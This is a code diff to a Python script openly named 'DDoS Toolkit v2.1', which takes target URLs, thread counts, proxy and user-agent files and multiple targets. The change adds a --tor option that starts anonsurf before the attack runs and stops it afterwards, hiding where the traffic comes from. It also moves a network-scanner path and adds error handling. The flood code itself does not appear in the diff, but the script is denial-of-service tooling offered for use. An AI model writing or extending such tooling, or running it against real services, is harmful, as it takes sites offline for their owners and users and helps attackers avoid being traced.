@@ -89,21 +89,21 @@ def display_banner():
     print(f"""
 {BLUE}
 ████████████████████████████████████████████████████████
-██                                                    ██
-██          DDoS Toolkit v2.0 Coded by LIONMAD        ██                         
-██      USE WITH CAUTION, PROCEED AT YOUR OWN RISK.   ██                                                                 
-██             LIONMAD SALUTES YOU LIONMAD            ██
-██    LIONMAD SALUTES YOU      LIONMAD SALUTES YOU    ██
-██    LIONMAD SALUTES YOU      LIONMAD SALUTES YOU    ██
-██    LIONMAD SALUTES YOU      LIONMAD SALUTES YOU    ██
-██                                                    ██
+██                                                             ██
+██             DDoS Toolkit v2.1 Coded by LIONMAD              ██
+██        USE WITH CAUTION, PROCEED AT YOUR OWN RISK.          ██                                  
+██                LIONMAD SALUTES YOU LIONMAD                  ██
+██        LIONMAD SALUTES YOU      LIONMAD SALUTES YOU         ██
+██        LIONMAD SALUTES YOU      LIONMAD SALUTES YOU         ██
+██        LIONMAD SALUTES YOU      LIONMAD SALUTES YOU         ██
+██                                                             ██
 ████████████████████████████████████████████████████████
 {RESET}
 """)
 
 def parse_args():
     """Parse command-line arguments."""
-    parser = argparse.ArgumentParser(description="DDoS Toolkit v2.0 Coded By LIONBAD")
+    parser = argparse.ArgumentParser(description="DDoS Toolkit v2.1 Coded By LIONBAD")
     parser.add_argument("-u", "--url", required=True, help="Target URL or IP address")
     parser.add_argument("-s", "--scan", action="store_true", help="Perform a network scan using NetScan lib ")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
@@ -119,6 +119,7 @@ def parse_args():
     parser.add_argument("--user-agents", help="File containing custom user-agent strings")
     parser.add_argument("--multi-target", help="File containing multiple target URLs or IPs")
     parser.add_argument("--ai-optimization", action="store_true", help="Enable AI-powered optimization")
+    parser.add_argument("--tor", action="store_true", help="Enable Tor using anonsurf for anonymity")
     return parser.parse_args()
 
 def load_proxies(proxy_file: str):
@@ -201,28 +202,79 @@ def generate_payload(payload_type: str):
         return None
 
 def run_network_scanner(target_ip):
-    """Run the netscan script."""
+    """Run the netscan script with enhanced error handling and validation."""
     try:
         # Define the main directory for netscan.py
-        netscan_path = "/opt/DDoS-Toolkit/lib/netscan"
+        netscan_path = "/opt/DDoS-Toolkit/assets/netscan"
         
         # Check if netscan.py exists in the defined directory
         if not os.path.isfile(netscan_path):
-            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/lib/ ...... Aborting.{RESET}")
+            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
             return
-        
+
+        # Check if Python3 is installed
+        if not shutil.which("python3"):
+            print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
+            return
+
         # Build the command
         command = ["python3", netscan_path, "-t", target_ip]
-        
+
         # Execute the command
         print(f"{BLUE}[*] Starting network scan on {target_ip}...{RESET}")
         subprocess.run(command, check=True)
-    
-    except subprocess.CalledProcessError as e:
-        print(f"{RED}[!] Error running network scanner: {e}{RESET}")
-    except Exception as e:
-        print(f"{RED}[!] An unexpected error occurred: {e}{RESET}")
 
+        print(f"{GREEN}[+] Network scan on {target_ip} completed successfully.{RESET}")
+
+    except subprocess.CalledProcessError as cpe:
+        print(f"{RED}[!] Error during network scan: {cpe}.{RESET}")
+    except FileNotFoundError as fnf:
+        print(f"{RED}[!] Required file or command not found: {fnf}.{RESET}")
+    except Exception as e:
+        print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")
+
+def run_anonsurf(mode):
+    """Run the anonsurf script with error handling and validation."""
+    try:
+        # Define the main directory for anonsurf
+        anonsurf_path = "/opt/DDoS-Toolkit/assets/anonsurf"
+        
+        # Check if anonsurf exists in the defined directory
+        if not os.path.isfile(anonsurf_path):
+            print(f"{RED}[ERROR] anonsurf script not found in {anonsurf_path}. Aborting.{RESET}")
+            return
+        
+        # Validate the mode
+        if mode not in ["start", "stop"]:
+            print(f"{YELLOW}[WARNING] Invalid mode '{mode}' specified. Please use 'start' or 'stop'.{RESET}")
+            return
+        
+        # Build the command
+        command = ["bash", anonsurf_path, mode]
+        
+        # Notify user about the action
+        action_message = "Starting" if mode == "start" else "Stopping"
+        print(f"{BLUE}[INFO] {action_message} anonsurf...{RESET}")
+        
+        # Execute the command
+        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        
+        # Check command result
+        if result.returncode == 0:
+            print(f"{GREEN}[SUCCESS] anonsurf {mode} completed successfully!{RESET}")
+        else:
+            print(f"{RED}[ERROR] anonsurf {mode} failed with return code {result.returncode}.{RESET}")
+            print(f"{RED}[DETAILS] {result.stderr.strip()}{RESET}")
+    
+    except FileNotFoundError:
+        print(f"{RED}[ERROR] 'bash' not found. Ensure bash is installed and available in PATH.{RESET}")
+    except subprocess.SubprocessError as e:
+        print(f"{RED}[ERROR] Subprocess error occurred: {e}{RESET}")
+    except Exception as e:
+        print(f"{RED}[ERROR] An unexpected error occurred: {e}.{RESET}")
+    finally:
+        print(f"{BLUE}[INFO] Exiting anonsurf handler.{RESET}")
+        
 async def resolve_target(target_url: str):
     """Resolve the target URL to an IP address."""
     try:
@@ -509,6 +561,11 @@ async def main():
 
     display_banner()
 
+    # If --tor is provided, start anonsurf
+    if args.tor:
+        print(f"{BLUE}[INFO] Starting Tor via anonsurf...{RESET}")
+        run_anonsurf("start")
+
     # If --scan is provided, perform the scan and exit
     if args.scan:
         target = args.url.split("//")[-1].split("/")[0]
@@ -583,6 +640,11 @@ async def main():
     # Adjust parameters based on AI feedback
     if args.ai_optimization:
         adjust_parameters_based_on_feedback()
+
+    # If --tor is provided, stop anonsurf after the attack
+    if args.tor:
+        print(f"{BLUE}[INFO] Stopping Tor via anonsurf...{RESET}")
+        run_anonsurf("stop")
 
 if __name__ == "__main__":
     # Handle signals for graceful exit
